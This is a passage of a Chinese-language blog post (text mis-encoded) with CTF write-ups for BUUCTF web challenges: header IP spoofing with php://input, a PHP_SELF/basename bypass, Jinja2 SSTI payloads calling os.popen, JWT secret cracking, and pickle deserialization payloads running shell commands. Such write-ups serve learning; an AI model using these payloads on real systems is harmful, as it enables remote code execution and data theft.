class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>å‡ºç°äº†æ–°çš„æºç <br>ç¬¬ä¸€æ­¥æ˜¯ä¼ªé€ ip<br>æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
<p>æµ‹è¯•ä»…client-ipå¯ä»¥ä½¿ç”¨<br>headerä¸­æ·»åŠ client-ip<br>file_get_contentsç”¨phpä¼ªåè®®ç»•è¿‡</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-number">2333</span>=php://<span class="hljs-built_in">input</span><br>pos<span class="hljs-variable">t:todat</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> happy day<br></code></pre></td></tr></table></figure>
<p>è¿™æ­¥å¼€å§‹ç”¨burpæ“ä½œï¼Œhackbaræœ‰ç‚¹é—®é¢˜</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change($v)&#123; <br>    $v = base64_decode($v); <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™å—åå‘ç¼–è¯‘ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/KZK2SNH27KTYEM6Y.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>ç‚¹å‡»sourceæŸ¥çœ‹æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-regexp">//</span> FLAG is defined <span class="hljs-keyword">in</span> config.php<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>ä»£ç å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨config.phpé‡Œ<br>ä½†æ˜¯ä¸‹é¢åˆè¿‡æ»¤äº†config.php&#x2F;<br>$_SERVER[â€˜PHP_SELFâ€™]è¿”å›çš„æ˜¯è·¯å¾„+è„šæœ¬å<br>ä¸‹é¢æœ‰ä¸€è¡Œä»£ç è¡¨ç¤ºå¯ä»¥ç›´æ¥è·å¾—flagï¼Œä½†è¦èƒ½å¤Ÿç ´è§£éšæœºæ•°å°±èƒ½å¾—åˆ°flagï¼Œè¿™ä¸ªéš¾åº¦å¤ªå¤§äº†ã€‚ã€‚</p>
<p>è¿™é‡Œæ˜¯æœ‰çªç ´ç‚¹çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ³¨æ„è¿™é‡Œ&#x2F;config.php/*$æ˜¯åŒ¹é…äº†å°¾éƒ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°¾éƒ¨æ·»åŠ ä¸å¯æ˜¾å­—ç¬¦æ¥ç»•è¿‡æ­£åˆ™ï¼Œæ¯”å¦‚%ff</p>
<p>basename()<br>ä¼šè¿”å›è·¯å¾„é‡çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚æ¯”å¦‚&#x2F;index.php&#x2F;config.phpä½¿ç”¨basename()ä¹‹åè¿”å›config.phpã€‚<br>basename()ä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p>
<p>è¿™é‡Œå†™ä¸€æ®µphpè¯­å¥æ¥ææ¸…æ¥š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;index.php/config.php%ff?source&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><br></code></pre></td></tr></table></figure>

<p><img src="/images/YVE0N5JFKM9LXPB.png" srcset="/img/loading.gif" lazyload><br>å› ä¸º$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨&#x2F;index.php&#x2F;config.php&#x2F;%ff?sourceæ¥è¯»å–flagã€‚<br><img src="/images/RZX7CIEXRHL29BSAOH.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>é¢˜ç›®è¯´äº†æ˜¯å…³äºflaskçš„<br>æºä»£ç æœ‰æç¤ºå‚æ•°ä¸ºsearch<br>æ‰€ä»¥ç›´æ¥sstiæ³¨å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">4</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/DHRQ62NL9WHJ3KCS.png" srcset="/img/loading.gif" lazyload><br>å› ä¸ºæ˜¯ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ¤æ–­å¾ˆè‡ªç„¶å°±æ˜¯jinja2çš„æ¨¡æ¿æ³¨å…¥ã€‚</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>ç”¨basesæˆ–mroéƒ½è¡Œï¼Œåªè¦æ‰“å°è¿”å›(&lt;class â€˜objectâ€™&gt;,)ï¼Œæ‰¾åˆ°äº†ä»–çš„åŸºç±»objectå³å¯<br><img src="/images/F34OP5L5YL70ND5.png" srcset="/img/loading.gif" lazyload><br>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨subclasses() è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯è¿™ä¸ªç±»çš„å­ç±»çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯objectç±»çš„å­ç±»çš„é›†åˆã€‚</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/XB3KH95A5B5FCPYQ.png" srcset="/img/loading.gif" lazyload><br>åœ¨åŸºæœ¬ç±»çš„å­ç±»ä¸­æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»(è²Œä¼¼æ˜¯ä¸ªç±»å°±è¡Œ)<br>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰¾ç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„ç±»</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOCO5EUQUU6V8XXB.png" srcset="/img/loading.gif" lazyload></p>
<p>æµ‹è¯•å‘ç°globalsè¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨æ‹¼å‡‘æ³•ç»•è¿‡</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥åˆ©ç”¨evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/S9WS6UXXSXDW65FE.png" srcset="/img/loading.gif" lazyload><br>flagåœ¨flasklightä¸­</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2124510">å…³äºflaskçš„SSTIæ³¨å…¥[é€šä¿—æ˜“æ‡‚]</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679?time__1311=n4+xnD0DBDgDc7D9DUO4BqOoTnl7WSWDIxrD#toc-8">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p>
<h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun" class="headerlink" title="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"></a>ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun</h2><p>æ ¹æ®é¡µé¢çš„æç¤ºï¼Œéœ€è¦æ‰¾åˆ°lv6<br>ä½†æ˜¯ç¿»äº†å¾ˆå¤šé¡µä¹Ÿæ²¡æœ‰æ‰¾åˆ°lv6<br>å†™ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br>url = &#x27;http://eca3df9d-<span class="hljs-number">0ecd</span>-<span class="hljs-number">46b6</span>-b0ab-7166f51fb956.node5.buuoj.cn:<span class="hljs-number">81</span>/shop?page=&#x27;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2000</span>):<br>    a = requests.<span class="hljs-built_in">get</span>(url + str(i))<br>    <span class="hljs-keyword">if</span> &#x27;lv6.png&#x27; <span class="hljs-keyword">in</span> a.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">break</span><br><br></code></pre></td></tr></table></figure>
<p>åœ¨181é¡µå‘ç°lv6<br>å‘ç°ä»·æ ¼æœ‰ç‚¹é«˜ï¼Œçœ‹èƒ½ä¸èƒ½æŠ“åŒ…æ”¹ä¸‹ä»·æ ¼<br>åªèƒ½æ”¹æŠ˜æ‰£<br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/V7NOFLUCZI1RNT.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæ¶‰åŠåˆ°JWTä¼ªé€ æ¼æ´<br>æ”»å‡»å·¥å…·<a href="https://link.csdn.net/?target=https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>è·å¾—å¯†åŒ™<br>æˆ‘ä½¿ç”¨çš„æ˜¯kaliç³»ç»Ÿ<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png" srcset="/img/loading.gif" lazyload><br>ç ´è§£è·å¾—å¯†åŒ™1Kun<br>ç„¶åè®¿é—®<a target="_blank" rel="noopener" href="https://jwt.io/">JWTæ”»å‡»ç½‘ç«™</a>,å°†JWTå¤åˆ¶ä¸Šå»å³å¯<br><img src="/images/JNBAT35QJHZPXF.png" srcset="/img/loading.gif" lazyload><br>å°†usernameæ”¹ä¸ºadminï¼Œè¿˜æœ‰å°†åˆšæ‰çš„å¯†åŒ™å¡«å…¥<br>å°†cookiesçš„JWTæ›¿æ¢ï¼Œå¾—åˆ°<br><img src="/images/YLWH6TZTRJ3H32BKER9.png" srcset="/img/loading.gif" lazyload><br>æºç ä¸­å‘ç°<br><img src="/images/R8M363537PNFDRFIUH.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°admin.py<br><img src="/images/CHUL1P513UOV9ZY610EI.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå¯ä»¥ç†è§£ä¸ºä¸phpä¸€æ ·çš„ååºåˆ—åŒ–</p>
<p>self.render(â€˜form.htmlâ€™, res&#x3D;p, member&#x3D;1)<br>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ï¼Œè¿›è¡Œæ¸²æŸ“ï¼Œä»è€Œæ˜¾ç¤ºé¡µé¢<br>æ¥è§‚å¯Ÿä¸€ä¸‹form.htmlé¡µé¢<br><img src="/images/P0U5OSG2IY3UT03FE6C.png" srcset="/img/loading.gif" lazyload><br>è¯´æ˜ä¼ å…¥çš„æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå›æ˜¾çš„ï¼Œè€Œä¸”å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå› æ­¤å­˜åœ¨Pickleååºåˆ—åŒ–æ¼æ´ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªé€šè¿‡pickle.dumpsåºåˆ—åŒ–çš„payloadï¼Œä»è€Œè¢«è§£æè¯»å–flagæˆ–å…¶ä»–ä¿¡æ¯ã€‚<br>æˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨<br>æ„é€ payloadå¯ä»¥ä½¿ç”¨æ–¹æ³•__reduce__(self)ï¼Œå…ˆè¦è·å–çš„flagæ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åè¿›è¡Œè¯»å–</p>
<p>ç‚¹å‡»ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜åï¼Œæ›¿æ¢become<br>os.systemå’Œos.popen<br>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œæˆåé€€å‡ºï¼Œè¿”å›ç»“æœæ˜¯å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯0<br>os.popen() æ— æ³•è¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼<br>è¿™ä¸¤ä¸ªå‡½æ•°åªæœ‰ä»¥printè¾“å‡ºæ—¶æ‰ä¼šå›æ˜¾ï¼Œå¦‚æœæ˜¯ä»¥returnè¿”å›çš„å°±ä¸ä¼šæ˜¾ç¤ºç»“æœã€‚<br>å¯ä»¥ä½¿ç”¨commands.getoutput()è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œä»£æ›¿ï¼Œæ„é€ payload</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">ls</span> /&#x27;,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VCLCNT98$GCXFF8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/JN7XR4QJ48H7LL1I58.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°flag.txtæ–‡ä»¶ï¼Œå¹¶è¯»å–</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">cat</span> /<span class="hljs-title">flag</span>.<span class="hljs-title">txt&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">Python Pickleååºåˆ—åŒ–æ¼æ´</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">è®¤è¯†JWT</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>buuctf_web</div>
      <div>http://example.com/2023/12/20/buuctf_web/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>å¥‡æ€ªçš„å¥‡æ€ª</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2023å¹´12æœˆ20æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/14/sql-labs/" title="sql-labs">
                        <span class="hidden-mobile">sql-labs</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
